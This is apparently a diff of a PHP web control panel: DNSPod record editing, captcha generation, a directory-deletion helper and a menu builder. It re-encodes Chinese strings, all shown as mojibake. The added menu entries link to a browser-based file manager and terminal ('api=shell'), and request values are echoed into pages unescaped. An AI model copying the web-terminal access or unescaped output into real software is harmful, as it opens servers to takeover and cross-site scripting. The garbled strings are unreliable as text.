-                                                '<item><![CDATA[ÍøÍ¨]]></item>'.
-                                                '<item><![CDATA[½ÌÓıÍø]]></item>'.
-                                                '<item><![CDATA[ÒÆ¶¯]]></item>'.
-                                                '<item><![CDATA[ÌúÍ¨]]></item>'.
-                                                '<item><![CDATA[¹úÍâ]]></item>'.
+                                                '<item><![CDATA[é»˜è®¤]]></item>'.
+                                                '<item><![CDATA[ç”µä¿¡]]></item>'.
+                                                '<item><![CDATA[ç½‘é€š]]></item>'.
+                                                '<item><![CDATA[æ•™è‚²ç½‘]]></item>'.
+                                                '<item><![CDATA[ç§»åŠ¨]]></item>'.
+                                                '<item><![CDATA[é“é€š]]></item>'.
+                                                '<item><![CDATA[å›½å¤–]]></item>'.
                                                 '</lines>'.
                                                 '</dnspod>';
                         }       
@@ -11189,13 +12817,13 @@ function changeimg()
                         $record_type = "";
                         for($i=0;$i<$objList->length;$i++){
                                 if ($i=='0'){
-                                        $record_line = $record_line.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
+                                        $record_line = $record_line.($objList->item($i)->nodeValue);
                                 }
                                 else{
-                                        $record_line = $record_line.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
+                                        $record_line = $record_line.",".($objList->item($i)->nodeValue);
                                 }
                         }
-                        //$record_line = "Ä¬ÈÏ,µçĞÅ,ÍøÍ¨,½ÌÓıÍø,ÒÆ¶¯,ÌúÍ¨,¹úÍâ";
+                        //$record_line = "é»˜è®¤,ç”µä¿¡,ç½‘é€š,æ•™è‚²ç½‘,ç§»åŠ¨,é“é€š,å›½å¤–";
                         for ($record_linei = 0; $record_linei < count(split("[,]",$record_line));$record_linei++){
                         ?>
                                 <OPTION VALUE="<?php echo arrmember(split(",",$record_line),($record_linei))?>" <?php if (trim(request("record_line"))==arrmember(split("[,]",$record_line),($record_linei))) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_line),($record_linei))?></OPTION>
@@ -11203,10 +12831,10 @@ function changeimg()
                         }
                         ?>
                         </SELECT>
-                        &nbsp¼ÇÂ¼Öµ£º<input type="text" class="text" name="value" value="<?php echo trim(request("value"))?>" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspMXÓÅÏÈ¼¶£º<input type="text" class="text" name="mx" value="<?php echo trim(request("mx"))?>" style="height:20px;width:5%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspTTL£º<input type="text" class="text" name="ttl" value="<?php echo trim(request("ttl"))?>" style="height:20px;width:5%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÑéÖ¤Âë£º<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" maxlength="4" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
+                        &nbspè®°å½•å€¼ï¼š<input type="text" class="text" name="value" value="<?php echo trim(request("value"))?>" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspMXä¼˜å…ˆçº§ï¼š<input type="text" class="text" name="mx" value="<?php echo trim(request("mx"))?>" style="height:20px;width:5%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspTTLï¼š<input type="text" class="text" name="ttl" value="<?php echo trim(request("ttl"))?>" style="height:20px;width:5%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspéªŒè¯ç ï¼š<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" maxlength="4" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                         <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                         <input type="hidden" class="text" name="refer" value="<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']))?>"> 
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
@@ -11220,7 +12848,7 @@ function changeimg()
                         }
                         else{   
                                 //echo trim(request("sub_domain"));
-                                AlertBack ("¼ÇÂ¼»ò¼ÇÂ¼Öµ¸ñÊ½´íÎó£¡" , 2);
+                                AlertBack ("è®°å½•æˆ–è®°å½•å€¼æ ¼å¼é”™è¯¯ï¼" , 2);
                         }       
                 }
                 if (trim(request("edit")) == "0"){
@@ -11315,11 +12943,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ×ÓÓòÃûĞŞ¸Ä³É¹¦£¡×ÓÓòÃûID£º<?php echo $objXml->getElementsByTagName("id")->item(0)->nodeValue?> Êµ¼Ê×ÓÓòÃû¼ÇÂ¼£º<?php echo $objXml->getElementsByTagName("name")->item(0)->nodeValue." <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                å­åŸŸåä¿®æ”¹æˆåŠŸï¼å­åŸŸåIDï¼š<?php echo $objXml->getElementsByTagName("id")->item(0)->nodeValue?> å®é™…å­åŸŸåè®°å½•ï¼š<?php echo $objXml->getElementsByTagName("name")->item(0)->nodeValue." <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
         <?php 
@@ -11333,11 +12961,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ×ÓÓòÃûĞŞ¸ÄÊ§°Ü£¡Ô­Òò£º<?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue." <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                å­åŸŸåä¿®æ”¹å¤±è´¥ï¼åŸå› ï¼š<?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue." <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
         <?php 
@@ -11358,13 +12986,13 @@ function changeimg()
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result">
-											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>È·ÈÏ</a>
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>È¡Ïû</a>
+											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>ç¡®è®¤</a>
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>å–æ¶ˆ</a>
                 </td>
         </tr>  
 </table> 
@@ -11377,11 +13005,11 @@ function changeimg()
         <script language="vbscript">
         <!--
                 Dim delok
-                delok = MsgBox("ÊÇ·ñÉ¾³ı¸ÃÏà²á£¡", vbOKCancel, "X3193")
+                delok = MsgBox("æ˜¯å¦åˆ é™¤è¯¥ç›¸å†Œï¼", vbOKCancel, "X3193")
                 If delok = vbOK Or delok = vbYes Then
                         window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1"
                 else    
-                        MsgBox("¸ÃÏà²áÉ¾³ıÈ¡Ïû£¡")
+                        MsgBox("è¯¥ç›¸å†Œåˆ é™¤å–æ¶ˆï¼")
                         window.location.href="<?php echo trim(request("refer"))?>"
                 End If
         //-->
@@ -11450,7 +13078,7 @@ function changeimg()
                                                 '<item>'.
                                                 '<id>5246120</id>'.
                                                 '<name>@</name>'.
-                                                '<line><![CDATA[Ä¬ÈÏ]]></line>'.
+                                                '<line><![CDATA[é»˜è®¤]]></line>'.
                                                 '<type>A</type>'.
                                                 '<ttl>600</ttl>'.
                                                 '<value>1.1.1.1</value>'.
@@ -11497,7 +13125,7 @@ function changeimg()
                         $objXml = new DOMDocument();  
                         $objXml->preserveWhiteSpace = true;
                         $objXml->async = false; 
-                        // ¼ÓXml ÎÄ¼ş    
+                        // åŠ Xml æ–‡ä»¶    
                         $objXml->loadXML($xmlstr);
                         
                         $objList = $objXml->getElementsByTagName("item");                       
@@ -11561,7 +13189,7 @@ function changeimg()
                         }                               
                 }
                 elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) == 0){
-                        AlertBack ("Î´Ñ¡ÔñÈÎºÎ×ÓÓòÃû¼ÇÂ¼£¡" , 1);
+                        AlertBack ("æœªé€‰æ‹©ä»»ä½•å­åŸŸåè®°å½•ï¼" , 1);
                         break;
                 }       
 
@@ -11575,11 +13203,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ×ÓÓòÃûÉ¾³ı³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                å­åŸŸååˆ é™¤æˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -11595,11 +13223,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ×ÓÓòÃûÉ¾³ıÊ§°Ü£¡Ô­Òò£º <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue;?><?php  echo " <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                å­åŸŸååˆ é™¤å¤±è´¥ï¼åŸå› ï¼š <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue;?><?php  echo " <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -11712,7 +13340,7 @@ function changeimg()
                         $objXml = new DOMDocument();  
                         $objXml->preserveWhiteSpace = true;
                         $objXml->async = false; 
-                        // ¼ÓXml ÎÄ¼ş    
+                        // åŠ Xml æ–‡ä»¶    
                         $objXml->loadXML($xmlstr);      
                 
                         $objList = $objXml->getElementsByTagName("item");                       
@@ -11778,7 +13406,7 @@ function changeimg()
                         }                               
                 }
                 elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) == 0){
-                        AlertBack ("Î´Ñ¡ÔñÈÎºÎ×ÓÓòÃû¼ÇÂ¼£¡" , 1);
+                        AlertBack ("æœªé€‰æ‹©ä»»ä½•å­åŸŸåè®°å½•ï¼" , 1);
                         break;
                 }
                 
@@ -11792,11 +13420,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ×ÓÓòÃû¼ÇÂ¼<?php  if (trim(request("status")) == "enable"){ ?>Æô¶¯<?php  }else{ ?>Í£Ö¹<?php }?>³É¹¦£¡<?php echo ($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                å­åŸŸåè®°å½•<?php  if (trim(request("status")) == "enable"){ ?>å¯åŠ¨<?php  }else{ ?>åœæ­¢<?php }?>æˆåŠŸï¼<?php echo ($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -11810,11 +13438,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ×ÓÓòÃû¼ÇÂ¼<?php  if (trim(request("status")) == "enable"){ ?>Æô¶¯<?php  }else{ ?>Í£Ö¹<?php }?>Ê§°Ü£¡, Ô­Òò: <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?><?php echo " <br>".$timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                å­åŸŸåè®°å½•<?php  if (trim(request("status")) == "enable"){ ?>å¯åŠ¨<?php  }else{ ?>åœæ­¢<?php }?>å¤±è´¥ï¼, åŸå› : <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?><?php echo " <br>".$timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -11855,17 +13483,17 @@ elseif ($type == 'char'){
 	$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
 }
 
-//¶¨ÒåÓÃÀ´ÏÔÊ¾ÔÚÍ¼Æ¬ÉÏµÄÊı×ÖºÍ×ÖÄ¸; 
-$l = strlen($str); //µÃµ½×Ö´®µÄ³¤¶È; 
-//Ñ­»·Ëæ»ú³éÈ¡ËÄÎ»Ç°Ãæ¶¨ÒåµÄ×ÖÄ¸ºÍÊı×Ö; 
+//å®šä¹‰ç”¨æ¥æ˜¾ç¤ºåœ¨å›¾ç‰‡ä¸Šçš„æ•°å­—å’Œå­—æ¯; 
+$l = strlen($str); //å¾—åˆ°å­—ä¸²çš„é•¿åº¦; 
+//å¾ªç¯éšæœºæŠ½å–å››ä½å‰é¢å®šä¹‰çš„å­—æ¯å’Œæ•°å­—; 
 $numcount = $count;
 for($i=1;$i<=$numcount;$i++) 
 { 
 $num=rand(0,$l-1); 
-//Ã¿´ÎËæ»ú³éÈ¡Ò»Î»Êı×Ö;´ÓµÚÒ»¸ö×Öµ½¸Ã×Ö´®×î´ó³¤¶È, 
-//¼õ1ÊÇÒòÎª½ØÈ¡×Ö·ûÊÇ´Ó0¿ªÊ¼ÆğËã;ÕâÑù34×Ö·ûÈÎÒâ¶¼ÓĞ¿ÉÄÜÅÅÔÚÆäÖĞ; 
+//æ¯æ¬¡éšæœºæŠ½å–ä¸€ä½æ•°å­—;ä»ç¬¬ä¸€ä¸ªå­—åˆ°è¯¥å­—ä¸²æœ€å¤§é•¿åº¦, 
+//å‡1æ˜¯å› ä¸ºæˆªå–å­—ç¬¦æ˜¯ä»0å¼€å§‹èµ·ç®—;è¿™æ ·34å­—ç¬¦ä»»æ„éƒ½æœ‰å¯èƒ½æ’åœ¨å…¶ä¸­; 
 $authnum_session.= $str[$num]; 
-//½«Í¨¹ıÊı×ÖµÃÀ´µÄ×Ö·ûÁ¬ÆğÀ´Ò»¹²ÊÇËÄÎ»; 
+//å°†é€šè¿‡æ•°å­—å¾—æ¥çš„å­—ç¬¦è¿èµ·æ¥ä¸€å…±æ˜¯å››ä½; 
 } 
 return $authnum_session;
 }
@@ -11879,22 +13507,22 @@ function checkcode(){ // checkcode function start
 
 function Com_CreatValidCode($pSN){ 
 Header("Content-type:image/png",false);
-//¶¨Òåheader£¬ÉùÃ÷Í¼Æ¬ÎÄ¼ş£¬×îºÃÊÇpng£¬ÎŞ°æÈ¨Ö®ÈÅ; 
-//Éú³ÉĞÂµÄËÄÎ»ÕûÊıÑéÖ¤Âë 
-session_start();//¿ªÆôsession; 
+//å®šä¹‰headerï¼Œå£°æ˜å›¾ç‰‡æ–‡ä»¶ï¼Œæœ€å¥½æ˜¯pngï¼Œæ— ç‰ˆæƒä¹‹æ‰°; 
+//ç”Ÿæˆæ–°çš„å››ä½æ•´æ•°éªŒè¯ç  
+session_start();//å¼€å¯session; 
 $authnum_session = ''; 
 $str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
-//¶¨ÒåÓÃÀ´ÏÔÊ¾ÔÚÍ¼Æ¬ÉÏµÄÊı×ÖºÍ×ÖÄ¸; 
-$l = strlen($str); //µÃµ½×Ö´®µÄ³¤¶È; 
-//Ñ­»·Ëæ»ú³éÈ¡ËÄÎ»Ç°Ãæ¶¨ÒåµÄ×ÖÄ¸ºÍÊı×Ö; 
+//å®šä¹‰ç”¨æ¥æ˜¾ç¤ºåœ¨å›¾ç‰‡ä¸Šçš„æ•°å­—å’Œå­—æ¯; 
+$l = strlen($str); //å¾—åˆ°å­—ä¸²çš„é•¿åº¦; 
+//å¾ªç¯éšæœºæŠ½å–å››ä½å‰é¢å®šä¹‰çš„å­—æ¯å’Œæ•°å­—; 
 $numcount = trim(request("count"))==""?"4":trim(request("count"));
 for($i=1;$i<=4;$i++) 
 { 
 $num=rand(0,$l-1); 
-//Ã¿´ÎËæ»ú³éÈ¡Ò»Î»Êı×Ö;´ÓµÚÒ»¸ö×Öµ½¸Ã×Ö´®×î´ó³¤¶È, 
-//¼õ1ÊÇÒòÎª½ØÈ¡×Ö·ûÊÇ´Ó0¿ªÊ¼ÆğËã;ÕâÑù34×Ö·ûÈÎÒâ¶¼ÓĞ¿ÉÄÜÅÅÔÚÆäÖĞ; 
+//æ¯æ¬¡éšæœºæŠ½å–ä¸€ä½æ•°å­—;ä»ç¬¬ä¸€ä¸ªå­—åˆ°è¯¥å­—ä¸²æœ€å¤§é•¿åº¦, 
+//å‡1æ˜¯å› ä¸ºæˆªå–å­—ç¬¦æ˜¯ä»0å¼€å§‹èµ·ç®—;è¿™æ ·34å­—ç¬¦ä»»æ„éƒ½æœ‰å¯èƒ½æ’åœ¨å…¶ä¸­; 
 $authnum_session.= $str[$num]; 
-//½«Í¨¹ıÊı×ÖµÃÀ´µÄ×Ö·ûÁ¬ÆğÀ´Ò»¹²ÊÇËÄÎ»; 
+//å°†é€šè¿‡æ•°å­—å¾—æ¥çš„å­—ç¬¦è¿èµ·æ¥ä¸€å…±æ˜¯å››ä½; 
 } 
 //$pSN = $authnum_session;
 if(substr(PHP_VERSION, 0, 3)=='5.4'){
@@ -11905,29 +13533,29 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 }
  
 $_SESSION[$pSN] = $authnum_session; 
-//ÓÃsessionÀ´×öÑéÖ¤Ò²²»´í;×¢²ásession,Ãû³ÆÎªauthnum_session, 
-//ÆäËüÒ³ÃæÖ»Òª°üº¬ÁË¸ÃÍ¼Æ¬ 
-//¼´¿ÉÒÔÍ¨¹ı$_SESSION["authnum_session"]À´µ÷ÓÃ 
+//ç”¨sessionæ¥åšéªŒè¯ä¹Ÿä¸é”™;æ³¨å†Œsession,åç§°ä¸ºauthnum_session, 
+//å…¶å®ƒé¡µé¢åªè¦åŒ…å«äº†è¯¥å›¾ç‰‡ 
+//å³å¯ä»¥é€šè¿‡$_SESSION["authnum_session"]æ¥è°ƒç”¨ 
 
-//Éú³ÉÑéÖ¤ÂëÍ¼Æ¬£¬ 
+//ç”ŸæˆéªŒè¯ç å›¾ç‰‡ï¼Œ 
 srand((double)microtime()*1000000); 
-$im = imagecreate(52,14);//Í¼Æ¬¿íÓë¸ß; 
-//Ö÷ÒªÓÃµ½ºÚ°×»ÒÈıÖÖÉ«; 
+$im = imagecreate(52,14);//å›¾ç‰‡å®½ä¸é«˜; 
+//ä¸»è¦ç”¨åˆ°é»‘ç™½ç°ä¸‰ç§è‰²; 
 $bgcolor = ImageColorAllocate($im, 255,255,255); 
 $fontcolor = ImageColorAllocate($im, 0,0,0); 
 $gray = ImageColorAllocate($im, 0,0,0); 
-//½«ËÄÎ»ÕûÊıÑéÖ¤Âë»æÈëÍ¼Æ¬ 
+//å°†å››ä½æ•´æ•°éªŒè¯ç ç»˜å…¥å›¾ç‰‡ 
 imagefill($im,68,30,$gray); 
-//Èç²»ÓÃ¸ÉÈÅÏß£¬×¢ÊÍ¾ÍĞĞÁË; 
+//å¦‚ä¸ç”¨å¹²æ‰°çº¿ï¼Œæ³¨é‡Šå°±è¡Œäº†; 
 $li = ImageColorAllocate($im, 0,0,0); 
 for($i=0;$i<3;$i++) 
-{//¼ÓÈë3Ìõ¸ÉÈÅÏß;Ò²¿ÉÒÔ²»Òª;ÊÓÇé¿ö¶ø¶¨£¬ÒòÎª¿ÉÄÜÓ°ÏìÓÃ»§ÊäÈë; 
+{//åŠ å…¥3æ¡å¹²æ‰°çº¿;ä¹Ÿå¯ä»¥ä¸è¦;è§†æƒ…å†µè€Œå®šï¼Œå› ä¸ºå¯èƒ½å½±å“ç”¨æˆ·è¾“å…¥; 
         imageline($im,rand(0,30),rand(0,21),rand(20,40),rand(0,21),$li); 
 } 
-//×Ö·ûÔÚÍ¼Æ¬µÄÎ»ÖÃ; 
+//å­—ç¬¦åœ¨å›¾ç‰‡çš„ä½ç½®; 
 imagestring($im, 6, 8, -2.5, $authnum_session, $fontcolor); 
 for($i=0;$i<90;$i++) 
-{//¼ÓÈë¸ÉÈÅÏóËØ 
+{//åŠ å…¥å¹²æ‰°è±¡ç´  
         imagesetpixel($im, rand()%70 , rand()%30 , $gray); 
 } 
 ImagePNG($im); 
@@ -11939,12 +13567,12 @@ ImageDestroy($im);
 <?php 
 
 /***************************************************************************  
-*                        Pinyin.php(×öÎªÏÖÔÚµÄÖ÷Á÷¿ª·¢ÓïÑÔ)  
+*                        Pinyin.php(åšä¸ºç°åœ¨çš„ä¸»æµå¼€å‘è¯­è¨€)  
 *                ------------------------------  
 *        Date             : Nov 7, 2006  
-*        Copyright        : ĞŞ¸Ä×ÔÍøÂç´úÂë,°æÈ¨¹éÔ­×÷ÕßËùÓĞ  
+*        Copyright        : ä¿®æ”¹è‡ªç½‘ç»œä»£ç ,ç‰ˆæƒå½’åŸä½œè€…æ‰€æœ‰  
 *        Mail             :   
-*        Desc.            : Æ´Òô×ª»»  
+*        Desc.            : æ‹¼éŸ³è½¬æ¢  
 *        History          :  
 *        Date    :  
 *        Author  :   
@@ -12109,7 +13737,7 @@ function selstyle($skincolor){
 
 
 function deldir($dir,$day,$flag) {
-  //ÏÈÉ¾³ıÄ¿Â¼ÏÂµÄÎÄ¼ş£º
+  //å…ˆåˆ é™¤ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š
   $dh=opendir($dir);
   while ($file=readdir($dh)) {
     if($file!="." && $file!=".."){
@@ -12127,7 +13755,7 @@ function deldir($dir,$day,$flag) {
   closedir($dh);
   
   if($flag=='all'){
-  	//É¾³ıµ±Ç°ÎÄ¼ş¼Ğ£º
+  	//åˆ é™¤å½“å‰æ–‡ä»¶å¤¹ï¼š
   	if(rmdir($dir)) {
     	return true;
   	} else {
@@ -12177,12 +13805,12 @@ function selskin(){
         $style = new css;
 ?>
                 &nbsp
-                <a href="<?php  $style->configrequest($ScriptPath."?".$_SERVER['QUERY_STRING'],"skin","blue")?>" style="color:blue;text-decoration:none;font-size:9px"><?php echo formatchar('¡ô');?></a>
-                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","red")?>" style="color:red;text-decoration:none;font-size:9px"><?php echo formatchar('¡ô');?></a>
-                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","gold")?>" style="color:gold;text-decoration:none;font-size:9px"><?php echo formatchar('¡ô');?></a>
-                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","green")?>" style="color:green;text-decoration:none;font-size:9px"><?php echo formatchar('¡ô');?></a>
-                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","purple")?>" style="color:purple;text-decoration:none;font-size:9px"><?php echo formatchar('¡ô');?></a>
-                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","black")?>" style="color:black;text-decoration:none;font-size:9px"><?php echo formatchar('¡ô');?></a>
+                <a href="<?php  $style->configrequest($ScriptPath."?".$_SERVER['QUERY_STRING'],"skin","blue")?>" style="color:blue;text-decoration:none;font-size:9px"><?php echo ('â—†');?></a>
+                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","red")?>" style="color:red;text-decoration:none;font-size:9px"><?php echo ('â—†');?></a>
+                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","gold")?>" style="color:gold;text-decoration:none;font-size:9px"><?php echo ('â—†');?></a>
+                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","green")?>" style="color:green;text-decoration:none;font-size:9px"><?php echo ('â—†');?></a>
+                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","purple")?>" style="color:purple;text-decoration:none;font-size:9px"><?php echo ('â—†');?></a>
+                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","black")?>" style="color:black;text-decoration:none;font-size:9px"><?php echo ('â—†');?></a>
 
 <?php 
 }
@@ -12219,7 +13847,7 @@ function encodeuri($str){
         $str = str_replace(">", "%3E", $str);
         //$str = str_replace("-", "%2D", $str);
         //$str = str_replace("_", "%5F", $str);
-        // ÒÔÉÏÈ¡ÏûµÄ´úÂëÒ»¶È½«³ÌĞò¿¨ËÀ£¬ºó·¢ÏÖ½öÓĞ³¤Á¬½Ó±»¿¨£¬ÊÔÓÃÁ¬½Ó±àÂë¼ò»¯³É¹¦
+        // ä»¥ä¸Šå–æ¶ˆçš„ä»£ç ä¸€åº¦å°†ç¨‹åºå¡æ­»ï¼Œåå‘ç°ä»…æœ‰é•¿è¿æ¥è¢«å¡ï¼Œè¯•ç”¨è¿æ¥ç¼–ç ç®€åŒ–æˆåŠŸ
         return $str;
 }
 function decodeuri($str){
@@ -12349,99 +13977,105 @@ $sellinkstr = split("[|]",$str);
 $linkstr = "";
 for ($i = 0;$i < count($sellinkstr);$i++){
         switch (trim($sellinkstr[$i])) {
+                case "æ–‡ç®¡":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=fm&skin=".$skincolor."\" target=_blank>".('æ–‡ç®¡')."</a> ";
+                        break;
+                case "ç»ˆç«¯":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=shell&skin=".$skincolor."\" target=_blank>".('ç»ˆç«¯')."</a> ";
+                        break;
                 case "IVR":
-                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ivr&skin=".$skincolor."\">".formatchar('IVR')."</a> ";
+                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ivr&skin=".$skincolor."\">".('IVR')."</a> ";
                         break;
-                case "ÍøÅÌ":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=vdisk&skin=".$skincolor."\">".formatchar('ÍøÅÌ')."</a> ";
+                case "ç½‘ç›˜":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=vdisk&skin=".$skincolor."\">".('ç½‘ç›˜')."</a> ";
                         break;
-                case "ËÑË÷":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=bing&skin=".$skincolor."\">".formatchar('ËÑË÷')."</a> ";
+                case "æœç´¢":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=bing&skin=".$skincolor."\">".('æœç´¢')."</a> ";
                         break;
-                case "Í¼Æ¬":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=picture&skin=".$skincolor."\">".formatchar('Í¼Æ¬')."</a> ";
+                case "å›¾ç‰‡":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=picture&skin=".$skincolor."\">".('å›¾ç‰‡')."</a> ";
                         break;
-                case "ÊÓÆµ":
-                       	$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=tudou&skin=".$skincolor."\">".formatchar('ÊÓÆµ')."</a> ";
+                case "è§†é¢‘":
+                       	$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=tudou&skin=".$skincolor."\">".('è§†é¢‘')."</a> ";
                         break;
-                case "²å¼ş":
-                        $linkstr = $linkstr . "<a id=\"zonemap\" style=\"\" href=\"?api=setup&skin=".$skincolor."\" target=\"_blank\">".formatchar('²å¼ş')."</a> ";
+                case "æ’ä»¶":
+                        $linkstr = $linkstr . "<a id=\"zonemap\" style=\"\" href=\"?api=setup&skin=".$skincolor."\" target=\"_blank\">".('æ’ä»¶')."</a> ";
                         break;
-                case "¹¤¾ßÌõ":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ieshow&skin=".$skincolor."\">".formatchar('¹¤¾ßÌõ')."</a> ";
+                case "å·¥å…·æ¡":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ieshow&skin=".$skincolor."\">".('å·¥å…·æ¡')."</a> ";
                         break;
-                case "µØÇò":
